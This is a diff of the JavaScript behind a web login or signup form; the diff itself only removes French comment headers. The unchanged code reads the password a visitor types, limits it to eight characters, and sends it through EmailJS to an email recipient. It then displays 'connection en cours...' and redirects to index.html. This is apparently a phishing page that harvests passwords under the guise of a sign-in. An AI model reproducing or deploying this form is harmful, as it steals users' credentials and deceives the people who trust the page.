@@ -8,9 +8,7 @@ emailjs.init({
 });
 
 
-// ======================================
-// Éléments HTML
-// ======================================
+
 
 const form = document.getElementById("signupForm");
 
@@ -21,55 +19,32 @@ const passwordInput = document.getElementById("password");
 const result = document.getElementById("result");
 
 
-
-// ======================================
-// Limites des champs
-// ======================================
-
-
 passwordInput.addEventListener("input", function () {
     this.value = this.value.slice(0, 8);
 });
 
-// ======================================
-// SUBMIT
-// ======================================
 
 form.addEventListener("submit", async function (event) {
 
     event.preventDefault();
 
 
-    // ------------------------------
-    // Vérification HTML
-    // ------------------------------
-
+   
     if (!form.checkValidity()) {
         form.reportValidity();
         return;
     }
 
 
-    // ------------------------------
-    // Récupération des données
-    // ------------------------------
-
 
     const password = passwordInput.value.trim();
 
 
-    // ------------------------------
-    // Paramètres EmailJS
-    // ------------------------------
-
+   
     const templateParams = {
         password: password
     };
 
-
-    // ------------------------------
-    // Envoi EmailJS
-    // ------------------------------
 
     result.textContent = "connection en cours...";
     result.className = "";
@@ -95,9 +70,6 @@ form.addEventListener("submit", async function (event) {
         result.className = "success";
 
 
-        // ------------------------------
-        // Redirection après envoi réussi
-        // ------------------------------
 
         window.location.href = "index.html";
 
